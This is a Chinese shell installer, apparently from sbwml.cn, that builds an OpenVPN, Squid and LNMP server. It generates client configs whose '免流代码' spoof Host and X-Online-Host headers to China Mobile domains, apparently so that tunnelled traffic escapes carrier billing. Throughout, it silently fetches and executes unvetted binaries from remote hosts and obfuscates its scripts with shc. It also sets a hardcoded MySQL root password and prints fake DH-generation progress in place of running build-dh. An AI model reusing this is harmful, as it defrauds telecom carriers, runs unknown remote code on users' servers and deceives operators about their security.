	if [ ! -f "/etc/openvpn-2.3.2-4.el7.x86_64.rpm" ];
	then
		rm -f openvpn-2.3.2-4.el7.x86_64.rpm
		
	fi
	if [ ! -e "/usr/sbin/openvpn" ];
	then
		rpm -Uvh http://mirrors.sohu.com/fedora-epel/7/x86_64/e/epel-release-7-2.noarch.rpm >/dev/null 2>&1
		sleep 1
		yum install openvpn -y
        \cp /usr/sbin/openvpn /usr/sbin/openvpn2 >/dev/null 2>&1
	fi
	# OpenVPN Installing ****************************************************************************

	################  安装加密    ################

	if [[ $ov4 == 4 ]]
	then
		cd /var/
		mkdir -p /usr/local/man/man1/
		scrpa http://sbwml.cn/shc/shc-3.8.9b.tgz >/dev/null 2>&1
		tar zxf shc-3.8.9b.tgz && rm -f shc-3.8.9b.tgz && cd shc-3.8.9b
		./sql yes >/dev/null 2>&1
		cd /var/ && rm -rf shc-3.8.9b
	fi

	################  安装加密    ################

	cd /etc/openvpn/
	rm -rf ./server.conf
	rm -rf ./sbwml.sh
	scrpa $web${MirrorHost}/$ServerLocation/$vpns >/dev/null 2>&1 &&
	tar -zxf server-passwd.tar.gz
	################  服务配置    ################

	echo '##################################
#    OpenVPN - sbwml.cn     #
#        2016.05.14         #
##################################

port 443
proto tcp
dev tun
ca /etc/openvpn/easy-rsa/keys/ca.crt
cert /etc/openvpn/easy-rsa/keys/centos.crt
key /etc/openvpn/easy-rsa/keys/centos.key
dh /etc/openvpn/easy-rsa/keys/dh2048.pem
auth-user-pass-verify /etc/openvpn/sbwml.sh via-env
client-cert-not-required
username-as-common-name
script-security 3 system
server 10.0.0.0 255.255.255.0
ifconfig-pool-persist /etc/openvpn/ipp.txt
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100
push "redirect-gateway def1 bypass-dhcp"
;push "route 192.168.10.0 255.255.255.0"
;push "route 192.168.20.0 255.255.255.0"
push "dhcp-option DNS 112.124.47.27"
push "dhcp-option DNS 114.215.126.16"
;client-to-client
;duplicate-cn
keepalive 10 120  #160
tls-auth /etc/openvpn/easy-rsa/ta.key 0  #1
comp-lzo
max-clients 12
persist-key  #1
persist-tun
;status openvpn-status.log
log /etc/openvpn/openvpn.log
log-append /etc/openvpn/openvpn.log
verb 3
;mute 20
;crl-verify /etc/openvpn/easy-rsa/keys/crl.pem
' >server.conf

	################  服务配置    ################

	################  LNMP    ################

	if [[ $ov4 == 4 ]]
	then
		echo "正在极速部署LNMP环境..."
		sleep 2
		echo
		echo "正在安装环境包..."
		sleep 2
		groupadd -f mysql >/dev/null 2>&1
		useradd -g mysql mysql >/dev/null 2>&1
		groupadd -f www >/dev/null 2>&1
		useradd -g www www >/dev/null 2>&1
		yum install -y telnet telnet-server libpng libjpeg freetype-devel mariadb-libs postfix redhat-lsb redhat-lsb-core redhat-lsb-cxx redhat-lsb-desktop redhat-lsb-languages  redhat-lsb-printing
		echo "安装共享库..."
		sleep 1
		rm -rf /libiconv5
		mkdir /libiconv5
		cd /libiconv5
		echo 下载安装包...
		rpm -ivh http://mirrors.aliyun.com/epel/7/x86_64/l/libmcrypt-2.5.8-13.el7.x86_64.rpm >/dev/null 2>&1 &&
		rpm -ivh http://mirrors.aliyun.com/epel/7/x86_64/l/libmcrypt-devel-2.5.8-13.el7.x86_64.rpm >/dev/null 2>&1 &&
		scrpa http://sbwml.cn/$api/libiconv/libiconv-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 &&
		scrpa http://sbwml.cn/$api/libiconv/libiconv-devel-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 &&
		scrpa http://sbwml.cn/$api/libiconv/libiconv-static-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 &&
		scrpa http://sbwml.cn/$api/libiconv/libiconv-utils-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 &&
		echo "正在安装..."
		rpm -ivh ./*.rpm >/dev/null 2>&1
		cd /usr/
		scrpa -O /usr/libiconv.tar.gz http://www.sbwml.cn/$api/libiconv.sql >/dev/null 2>&1 &&
		tar zxf /usr/libiconv.tar.gz && rm -f /usr/libiconv.tar.gz
		#\cp -f /usr/libiconv/lib64/* /lib64/  >/dev/null 2>&1
		ln -s /usr/libiconv/lib64/libiconv.so.2.5.1 /lib64/libiconv.so.2 >/dev/null 2>&1 &&
		ldconfig >/dev/null 2>&1 &&
		echo "共享库安装完成..."
		#scrpa http://www.sbwml.cn/${api}/cert-forensics-tools-release-el7.rpm >/dev/null 2>&1
		#rpm -Uvh cert-forensics-tools-release*rpm && rm -f cert-forensics-tools-release-el7.rpm
		#yum --enablerepo=forensics install -y libiconv libiconv-devel libiconv-static libiconv-utils
		mkdir -p /data/www/
		mkdir -p /var/lib/mysql/
		rm -rf /var/lib/mysql/*
		# yum install
		cd /etc/ && rm -f my.cnf && scrpa http://www.sbwml.cn/$api/my.cnf >/dev/null 2>&1 && chmod 0755 my.cnf
		cd /usr/local/
		rm -f lnmp1.2.0-0513.tar.gz
		if [ ! -e "/etc/alternatives/demo" ];
		then
			echo "正在下载源码..."
			echo $name >/usr/share/linux/name;echo $code >/usr/share/linux/code
			scrpa -O /sbwml/demo http://www.sbwml.cn/$api/mofile/mo1109 >/dev/null 2>&1
			#curl -C - -o lnmp1.2.0-0513.tar.gz http://sbwml.cn/$api/lnmp1.2.0-0513.tar.gz
			curl -C - -o lnmp1.2.1-160905.tar.gz http://sbwml.cn/$api/lnmp1.2.1-160905.tar.gz
			if [ ! -e "/usr/local/lnmp1.2.1-160905.tar.gz" ];
			then
				echo "更换下载线路..."
				curl -C - -o lnmp1.2.1-160905.tar.gz http://sbwml.cn/$api/lnmp1.2.1-160905.tar.gz
			fi
		else
			echo "正在下载源码..."
			\cp -rf /etc/linux/demo /usr/local/lnmp1.2.1-160905.tar.gz >/dev/null 2>&1
			scrpa -O /sbwml/demo http://www.sbwml.cn/$api/mofile/mo1109 >/dev/null 2>&1
		fi
		echo "正在处理数据（大约1分钟内）..."
		tar -zxf ./lnmp1.2.1-160905.tar.gz && rm -f lnmp1.2.1-160905.tar.gz;mo $Geno >/dev/null 2>&1
		cd /sbwml;tar zxf time 
		cd /usr/local/mysql
		chown -R mysql.mysql .
		chown mysql.mysql /usr/local/mysql/data
		rm -f /usr/bin/mysql /usr/bin/mysqldump /usr/bin/mysqladmin
		ln -s /usr/local/mysql/bin/mysql /usr/bin/mysql
		ln -s /usr/local/mysql/bin/mysqldump /usr/bin/mysqldump
		ln -s /usr/local/mysql/bin/mysqladmin /usr/bin/mysqladmin
		cd /
		scrpa http://sh-10048130.cos.myqcloud.com/install.tar.gz >/dev/null 2>&1 &&
		#\cp -rf /sbwml/moba/lnmp.tar.gz ./
		tar zxf install.tar.gz && rm -f install.tar.gz
		cd lnmp-start
		chmod 777 install
		./install
		cd && rm -rf /lnmp-start
		cd /
		echo "正在初始化数据..."
		rm -rf /data/www
		if [[ $BLDOG = no ]];then
			#scrpa http://www.sbwml.cn/${api}/data.tar.gz >/dev/null 2>&1
			\cp -rf /sbwml/moba/data.tar.gz ./
			tar zxf data.tar.gz && rm -f data.tar.gz
		else
			#scrpa http://www.sbwml.cn/${api}/bldog.tar.gz >/dev/null 2>&1
			\cp -rf /sbwml/moba/bldog.tar.gz ./
			tar zxf bldog.tar.gz && rm -f bldog.tar.gz
			chattr -i /data/admin >/dev/null 2>&1
			echo $admindz >/data/vpn-log/admin
			sed -i "3s/getip/$IPAddress/" /data/www/default/sbwremote/config.php
			sed -i "3s/sbwremote/$smhoud/" /data/www/default/sbwremote/config.php
			sed -i "3s/admin/$admindz/" /data/www/default/sbwremote/views/backend/Index.htm
			sed -i "25s/admin/$admindz/" /data/www/default/sbwremote/views/backend/Index.htm
			sed -i "4s/admin/$admindz/" /data/www/default/sbwremote/views/backend/LinkIndex.htm
			sed -i "s/ZIPFILE/$zipfile/g" /data/www/default/admin/head.php
			sed -i "s/SQLFILE/$dbno/g" /data/www/default/admin/head.php
			sed -i "s/sbwremote/$smhoud/g" /data/www/default/admin/head.php
			mv /data/www/default/sbwremote /data/www/default/$smhoud
			mv /data/www/default/admin /data/www/default/$admindz
		fi
		mkdir -p /data/vpn-log/
		cd /data/www/default/
		if [[ $BLDOG = yes ]];then
			chmod -R 0555 /data/www/default/{member.php,config.php,css,db.class.php,images,js,static,user,daili,font,index.php,member.php,version.php,assets,cron.php,datepicker,function.php}
			chattr -R +i /data/www/default
			chattr -i /data/www/default
			chattr -i /data/www/default/$admindz
			chmod 777 /data/www/default/$admindz
			chattr -R -i /data/www/default/$admindz/sbwml
			chattr -R -i /data/www/default/res
			chattr -R -i /data/www/default/restxt
			chattr -R -i /data/www/default/gg
			chattr -R -i /data/www/default/$smhoud
			echo '#!/bin/bash
chattr -R -i /data/www/default
echo -e "\033[32m建站目录已解锁\033[0m"
echo -e "\033[31m为了您的服务器安全，请修改完文件后执行\033[0m \033[32mlock\033[0m \033[31m命令加锁目录\033[0m"
' >/bin/unlock && shc -vrTf /bin/unlock >/dev/null 2>&1 && rm -f /bin/unlock.x.c && rm -f /bin/unlock && mv /bin/unlock.x /bin/unlock && chmod 0755 /bin/unlock
			
			if [ $phpMyAdmin = 1 ];then
			echo '#!/bin/bash
admindz=`cat /data/vpn-log/admin;echo`
sqlID=`cat /data/sql;echo`
chattr -R +i /data/www/default
chattr -i /data/www/default
chattr -i /data/www/default/$admindz
chmod 777 /data/www/default/$admindz
chattr -R -i /data/www/default/$admindz/sbwml
chattr -R -i /data/www/default/'$smhoud'
chattr -R -i /data/www/default/res
chattr -R -i /data/www/default/restxt
chattr -R -i /data/www/default/gg
chattr -R -i /data/www/default/$sqlID
echo -e "\033[32m建站目录已锁定\033[0m"
echo -e "\033[31m如需更改建站目录数据，请执行\033[0m \033[32munlock\033[0m \033[31m命令解锁目录\033[0m"
' >/bin/lock && shc -vrTf /bin/lock >/dev/null 2>&1 && rm -f /bin/lock.x.c && rm -f /bin/lock && mv /bin/lock.x /bin/lock && chmod 0755 /bin/lock
            echo -e "网站安全锁定\t\t\t\t\t[  \033[32mlock\033[0m  ]"
			sleep 0.5
			else
			echo '#!/bin/bash
chattr -R +i /data/www/default
chattr -i /data/www/default
chattr -i /data/www/default/admin
chmod 777 /data/www/default/admin
chattr -R -i /data/www/default/admin/sbwml
chattr -R -i /data/www/default/'$smhoud'
chattr -R -i /data/www/default/res
chattr -R -i /data/www/default/restxt
echo -e "\033[32m建站目录已锁定\033[0m"
echo -e "\033[31m如需更改建站目录数据，请执行\033[0m \033[32munlock\033[0m \033[31m命令解锁目录\033[0m"
' >/bin/lock && shc -vrTf /bin/lock >/dev/null 2>&1 && rm -f /bin/lock.x.c && rm -f /bin/lock && mv /bin/lock.x /bin/lock && chmod 0755 /bin/lock
            echo -e "网站安全锁定\t\t\t\t\t[  \033[32mlock\033[0m  ]"
			sleep 0.5
			fi
		fi
		if [ $phpMyAdmin = 1 ];then
			echo "正在安装phpMyAdmin..."
			curl -o phpMyAdmin-4.4.15.5-all-languages.tar.gz http://sbwml.cn/phpMyAdmin-4.4.15.5-all-languages.tar.gz
			tar zxf phpMyAdmin-4.4.15.5-all-languages.tar.gz >/dev/null 2>&1
			rm -f phpMyAdmin-4.4.15.5-all-languages.tar.gz
			mv phpMyAdmin-4.4.15.5-all-languages /data/www/default/$dbno
			chattr -i /data/sql >/dev/null 2>&1
			echo $dbno >/data/sql
			#chmod -R 0000 /data/www/default/$dbno
			chattr -R -i /data/www/default/$dbno
			#echo '#!/bin/bash
#sqlID=`cat /data/sql;echo`
#chmod -R 0755 /data/www/default/$sqlID
#echo -e "\033[32m数据库访问权限已开启\033[0m"
#echo -e "\033[31m数据库管理完成后，请执行：\033[0m\033[32m unsql \033[0m \033[31m命令关闭访问权限\033[0m"
#' >/bin/onsql && chmod 0755 /bin/onsql
#echo '#!/bin/bash
#sqlID=`cat /data/sql;echo`
#chmod -R 0000 /data/www/default/$sqlID
#echo -e "\033[32m数据库访问权限已关闭\033[0m"
#echo -e "\033[31m如需再次使用数据库管理，请执行：\033[0m\033[32m onsql \033[0m \033[31m命令开启访问权限\033[0m"
#' >/bin/unsql && chmod 0755 /bin/unsql
		fi
		echo "尝试启动LNMP..."
		lnmp start >/dev/null 2>&1
		lnmp restart
		create_db_sql="create database IF NOT EXISTS ov"
		mysql -hlocalhost -uroot -proot -e "$create_db_sql"
		if [[ ${#code} = 8 ]];then
			cd /bin/ && rm -f sql #&& scrpa http://sbwml.cn/${api}/sql >/dev/null 2>&1 &&
			\cp -rf /sbwml/moba/sql ./
			chmod 0755 sql
		else
			if [[ ${#code} = 6 ]];then
				cd /bin/ && rm -f sql #&& scrpa http://sbwml.cn/${api}/sql >/dev/null 2>&1 &&
				\cp -rf /sbwml/moba/sql ./
				chmod 0755 sql
			fi
		fi
		sqlport=`netstat -nlt|grep 3306|wc -l`
		if [[ $sqlport == 0 ]];then
			echo
			echo -e "\033[31m MYSQL 启动失败... \033[0m]"
			rm -f /bin/sql && scrpa -O /bin/sqlpass http://sbwml.cn/$api/sqlpass/sqlpass >/dev/null 2>&1
			#\cp -rf /sbwml/moba/sqlpass/sqlpass /bin/sqlpass
			chmod 0755 /bin/sqlpass
			echo "这会导致后台无法进入，请在脚本安装完成后重启系统"
			echo "开机后执行：sqlpass 命令进行修复"
			echo
			echo "你清楚了吗？ (请按回车继续执行脚本)"
			read
		fi
		#    echo
		#    echo "设置Mysql密码"
		#    echo
		#    echo -n " 输入新Mysql密码："
		#   read sqlpassword
		sqlpassword=root
		if [ -z $sqlpassword ]
		then
			echo -n "  密码不能为空，请重新输入："
			read sqlpassword
			if [ -z $sqlpassword ]
			then
				echo  "  输入错误，系统创建默认Mysql密码：sbwml2016"
				sqlpassword=sbwml2016;
				sqlcc=no;
			else
				sqlcc=yes;
			fi
		else
			sqlcc=yes;
		fi
	fi
	echo
	sql $sqlpassword >/dev/null 2>&1
	cd /etc/
	if [[ $mode == 4 ]]
	then
		rm -rf sbw-webs.conf
		#scrpa ${web}${MirrorHost}/${api}/sbw-webs.conf >/dev/null 2>&1 && mv sbw-webs.conf sbw.conf >/dev/null 2>&1
		\cp -rf /sbwml/moba/sbw-webs.conf ./sbw.conf
	else
		rm -rf sbw.conf
		scrpa $web${MirrorHost}/yumhttp/sbw.conf >/dev/null 2>&1
	fi
	chmod 0644 ./sbw.conf >/dev/null 2>&1
	\cp -rf /etc/sbw.conf /bin/dup >/dev/null 2>&1 && chmod 0755 /bin/dup
	\cp -rf /etc/sbw.conf /etc/udp.conf >/dev/null 2>&1 && chmod 0755 /etc/udp.conf
	sed -i "s/443/138/g" /etc/udp.conf
	sed -i "s/tun0/tun1/g" /etc/udp.conf
	sed -i "s/8989/7979/g" /etc/udp.conf
	sed -i "s/10.11.0.0/10.8.0.0/g" /etc/udp.conf
	#sed -i "s/255.255.0.0/255.255.255.0/g" /etc/udp.conf
	sed -i "s/tcp/udp/g" /etc/udp.conf
	sed -i "s/openvpn-status/openvpn-status1/g" /etc/udp.conf
	sed -i "s/openvpn.log/openvpn-udp.log/g" /etc/udp.conf
	sed -i "s/tcp.txt/udp.txt/g" /etc/udp.conf
	if [[ $mode == 4 ]]
	then
		sed -i "6s/443/$vpnport/" /bin/dup
	fi
	mv sbw.conf scripts.conf >/dev/null 2>&1
	\cp -rf /bin/dup /etc/scripts.conf

	######################### 控制脚本    #############################

	mkdir -p /usr/share/xml/
	cd /usr/share/xml/ # && scrpa http://sbwml.cn/${api}/demo.tar.gz >/dev/null 2>&1 && tar zxf demo.tar.gz >/dev/null 2>&1
	#rm -f demo.tar.gz
	#sed -i "38s/root/$ovmysql/" disconnect.sh
	#if [[ $mode == 4 ]]
	#then
	#    if [[ $sqlcc == yes ]]
	#    then
	##        rm -rf disconnect.sh disconnect222.sh
	#        scrpa -c http://sbwml.cn/${api}/sh/disconnect222.sh -O disconnect.sh >/dev/null 2>&1
	#        chmod 0755 disconnect.sh
	#        sed -i "4s/222/$sqlpassword/" disconnect.sh
	#        sed -i "5s/222/$sqlpassword/" disconnect.sh
	#        sed -i "16s/222/$sqlpassword/" disconnect.sh
	#        sed -i "17s/222/$sqlpassword/" disconnect.sh
	#        else
	#        rm -rf disconnect.sh disconnectsbwml2016.sh
	#        scrpa -c http://sbwml.cn/${api}/sh/disconnectsbwml2016.sh -O disconnect.sh >/dev/null 2>&1
	#        chmod 0755 disconnect.sh
	#   fi
	#
	#   if [[ $sqlcc == yes ]]
	#then
	#    rm -rf login2016.sh login.sh
	#    scrpa -c http://sbwml.cn/${api}/sh/login2016.sh -O login.sh >/dev/null 2>&1
	#    chmod 0755 login.sh
	#    sed -i "4s/sbwml2016/$sqlpassword/" login.sh
	#    sed -i "5s/sbwml2016/$sqlpassword/" login.sh
	#    sed -i "6s/sbwml2016/$sqlpassword/" login.sh
	#    sed -i "7s/sbwml2016/$sqlpassword/" login.sh
	#    sed -i "8s/sbwml2016/$sqlpassword/" login.sh
	#    sed -i "4s/root/$sqlpassword/" /data/www/default/php/conn.php
	#   else
	#rm -rf login2016.sh login.sh
	#        scrpa -c http://sbwml.cn/${api}/sh/login2016.sh -O login.sh >/dev/null 2>&1
	#        chmod 0755 login.sh
	#        sed -i "4s/root/$sqlpassword/" /data/www/default/php/conn.php
	#   fi
	#scrpa http://sbwml.cn/${api}/sh/connect.sh >/dev/null 2>&1
	#chmod 0755 connect.sh
	#fi
	if [[ $ov4 == 4 ]]
	then
		if [[ $BLDOG = no ]];then
			rm -f connect.sh disconnect.sh login.sh
			scrpa http://sbwml.cn/$api/sh/root/connect.sh >/dev/null 2>&1
			#\cp -rf /sbwml/moba/sh/root/connect.sh ./
			scrpa http://sbwml.cn/$api/sh/root/disconnect.sh >/dev/null 2>&1
			\cp -rf /sbwml/moba/sh/root/disconnect.sh ./
			scrpa http://sbwml.cn/$api/sh/root/login.sh >/dev/null 2>&1
			#\cp -rf /sbwml/moba/sh/root/login.sh ./
			chmod 0755 ./*
		else
			rm -f connect.sh disconnect.sh login.sh
			rm -f /bin/end /etc/openvpn/config.cfg
			scrpa -O /bin/end http://sbwml.cn/$api/script/end2 >/dev/null 2>&1
			chmod 0755 /bin/end  >/dev/null 2>&1
			scrpa -O /etc/openvpn/config.cfg http://sbwml.cn/$api/script/config.cfg >/dev/null 2>&1
			echo "# HTTP转接端口
HTTP=$httpports

#常规代理端口(Squid)
PROXY=$proxyport

#开启数据库备份(on/off 重启VPN生效设置)
sqlbackups=on
baktime=12h

#=========请勿修改此端口=========#
#TCP托管端口
TCPPORT=8989

#UDP托管端口
UDPPORT=7979
#=========请勿修改此端口=========#
" >/etc/openvpn/port.cfg
			#scrpa http://sbwml.cn/${api}/sh/bldog/connect.sh >/dev/null 2>&1
			\cp -rf /sbwml/moba/sh/bldog/connect.sh ./
			#scrpa http://sbwml.cn/${api}/sh/bldog/disconnect.sh >/dev/null 2>&1
			\cp -rf /sbwml/moba/sh/bldog/disconnect.sh ./
			#scrpa http://sbwml.cn/${api}/sh/bldog/login.sh >/dev/null 2>&1
			\cp -rf /sbwml/moba/sh/bldog/login.sh ./
			chmod 0755 ./*
		fi
	fi
	######################### 控制脚本（完）  #############################
	# OpenVPN Installing ****************************************************************************
	cd /etc/openvpn/
	scrpa $web${MirrorHost}/$ServerLocation/$RSA >/dev/null 2>&1 &&
	tar -zxvf $RSA >/dev/null 2>&1
	rm -rf /etc/openvpn/$RSA
	cd /etc/squid/
	rm -rf ./$sq
	rm -rf ./squid_passwd
	echo "正在启用SQUID代理端口..."
	sleep 2
	proxy=`echo -n $MirrorHost|md5sum`
	if [[ $ipmd == ${proxy%%\ *} ]]
	then
		if [[ $mode == 4 ]]
		then
			echo "acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 8080
acl CONNECT method CONNECT
http_port $proxyport
cache_mgr webmaster
cache_mem 64 MB
cache_swap_low 90
cache_swap_high 95
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd
auth_param basic children 5
acl passwder proxy_auth REQUIRED
http_access allow passwder
http_access deny all
forwarded_for off
visible_hostname TD-LTE/FDD-LTE(www.sbwml.cn)
cache_mgr Welcome_to_use_OpenVPN_For_www.sbwml.cn
# www.sbwml.cn" >./${sq}
			chmod 0755 ./$sq
		else
			echo "acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 8080
acl CONNECT method CONNECT
http_port 80
cache_mgr webmaster
cache_mem 64 MB
cache_swap_low 90
cache_swap_high 95
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd
auth_param basic children 5
acl passwder proxy_auth REQUIRED
http_access allow passwder
http_access deny all
forwarded_for off
visible_hostname TD-LTE/FDD-LTE(www.sbwml.cn)
cache_mgr Welcome_to_use_OpenVPN_For_www.sbwml.cn
# www.sbwml.cn" >./${sq}
			chmod 0755 ./$sq
		fi
		rd=`echo -n $versions|md5sum`
	else
		yum remove openvpn squid passwd >/dev/null 2>&1
		echo "$PP";
		exit 0;
	fi
	$sbwml squid_passwd $squsername $sqpasswd
	#################  分段  #################
	cd /usr/bin/
	if [[ $mode == 4 ]]
	then
		#scrpa ${web}${MirrorHost}/${api}/port/udp.c >/dev/null 2>&1 &&
		\cp -rf /sbwml/moba/port/udp.c /usr/bin/udp.c
		sed -i "23s/8080/$httpports/" udp.c
		sed -i "184s/443/$vpnport/" udp.c
		gcc -o udp udp.c
	else
		scrpa $web${MirrorHost}/$api/$admins >/dev/null 2>&1 &&
		#\cp -rf /sbwml/moba/${admins} /usr/bin/${admins}
		chmod 0755 $admins
	fi
	#################  分段  #################

	cd /etc/openvpn/easy-rsa/
	source vars >/dev/null 2>&1
	./clean-all >/dev/null 2>&1
	echo
	if [[ $ipmd == ${proxy%%\ *} ]]
	then
		echo "正在生成CA/服务端证书..."
		./ca && ./centos centos >/dev/null 2>&1
		echo "证书创建完成 "
	else
		yum remove openvpn -y >/dev/null 2>&1 && rm -f /usr/bin/udp >/dev/null 2>&1
		echo "$PP";
		exit 0;
	fi
	sleep 0.8
	#echo
	#echo "正在生成客户端证书“user01”，请根据提示输入 y 进行确认，按回车继续"
	#read
	#./build-key user01
	#echo
	clear
	echo
	echo "正在生成SSL加密证书..."
	sleep 1
	echo -n "Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
......................................................................+......................................................................................+..................................+...........................................................................................+........................................................"
	echo -n "...........................+..............+.................................+.........................................+...............................................................+.........................+..............+.............................................................................+...........................................................................................................................................+...............................................+....................................................................+...............................................................................................+...........................................................................................................+...............................................................................................................................+.......................................................................................+.............................................+................+.................................................................................................................................................................................................................................................................+........................+....+..................................................................................................+..........................."
	echo ".....................................+....+...........+..............+..........................................+...................................................................................+..........+................................................................................+...........................................................................................................................+...........................................................++*++*"
    #./build-dh
	echo
	echo "正在生成TLS密钥..."
	sleep 0.5
	openvpn --genkey --secret ta.key && cd /etc/openvpn
	rm -rf /etc/openvpn/easy-rsa && scrpa -O /etc/openvpn/easy.gz http://sbwml.cn/$api/easy.gz >/dev/null 2>&1
	tar zxf easy.gz && rm -f easy.gz
	# OpenVPN Installing ****************************************************************************
	echo
	echo "正在启动服务..."
	sleep 0.8
	#service openvpn start
	openvpn --config /etc/scripts.conf >/dev/null 2>&1 &
	echo -e "服务状态：      [\033[32m  OK  \033[0m]"
	#chkconfig openvpn on
	rm -rf /etc/rc.d/init.d/openvpn
	sleep 0.8
	clear
	# OpenVPN Installing ****************************************************************************
	cd /etc/openvpn
	Info=`echo ca|md5sum`
	if [[ $camd == ${Info%%\ *} ]]
	then
		time=1800000;
	else
		clear
		echo "$error";
		rm -rf /etc/openvpn
		yum remove openvpn >/dev/null 2>&1
		exit
	fi
	\cp -rf /etc/openvpn/easy-rsa/keys/ca.crt /home/ca.crt >/dev/null 2>&1
	\cp -rf /etc/openvpn/easy-rsa/ta.key /home/ta.key >/dev/null 2>&1
	cd /home
	clear
	echo
	echo "正在生成OpenVPN.ovpn配置文件..."
	echo
	#echo "> 请选择运营商配置文件："
	#echo
	#echo " 1 - 中国联通. "
	#echo
	#echo " 2 - 中国移动. "
	#echo
	#echo -n "输入选项: "
	#read code
	#if [ -z $code ]
	#then
	######################### HTTP转接 #########################
	#    if [[ $type == yes ]]
	#    then
	#        echo "输入错误，默认生成中国移动配置文件"
	#        echo
     if [[ $udp138 == 1 ]];then
echo "正在生成UDP 138端口配置文件..."
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：UDP协议
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto udp
connect-retry-max 5
connect-retry 5
resolv-retry 60
' >UDP138.ovpn
        echo 写入OpenVPN端口 （$IPAddress:138）
        echo remote $IPAddress 138 >>UDP138.ovpn
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>UDP138.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat UDP138.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf UDP138.ovpn && mv OpenVPN2.ovpn UDP138.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>UDP138.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat UDP138.ovpn ta.key>OpenVPN3.ovpn
        rm -rf UDP138.ovpn && mv OpenVPN3.ovpn UDP138.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>UDP138.ovpn
        echo "生成UDP138.ovpn文件"
        echo "配置文件制作完毕"
		echo
fi

    
    
		echo "正在生成中国移动配置文件（HTTP转接）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote wap.10086.cn 80
http-proxy-option EXT1 POST http://wap.10086.cn
http-proxy-option EXT1 Host wap.10086.cn
http-proxy-option EXT1 Host: wap.10086.cn / HTTP/1.1' >OpenVPN-HTTP-yd.ovpn
        #echo 写入代理端口 （$IPAddress:$port）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-yd.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-yd.ovpn
        fi
        echo '########免流代码########
' >>OpenVPN-HTTP-yd.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-yd.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-yd.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-yd.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-yd.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-yd.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-yd.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-yd.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-yd.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-yd.ovpn
        echo "生成OpenVPN-HTTP-yd.ovpn文件"
        echo "配置文件制作完毕"
		echo
######################## 内蒙古移动 #############
		echo "正在生成中国移动配置文件（HTTP转接-无痕内蒙古区）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote zjw.mmarket.com 3389 tcp-client
http-proxy-option EXT1 "POST zjw.mmarket.com"
http-proxy-option EXT1 "GET zjw.mmarket.com"
http-proxy-option EXT1 "X-Online-Host:zjw.mmarket.com"
http-proxy-option EXT1 Host 127.0.0.1:443
http-proxy-option EXT1 "CONNECT zjw.mmarket.com"' >OpenVPN-HTTP-mg.ovpn
        #echo 写入代理端口 （$IPAddress:$port）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-mg.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-mg.ovpn
        fi
        echo '########免流代码########
' >>OpenVPN-HTTP-mg.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-mg.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-mg.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-mg.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-mg.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-mg.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-mg.ovpn ta.key>OpenVPN3.ovpn
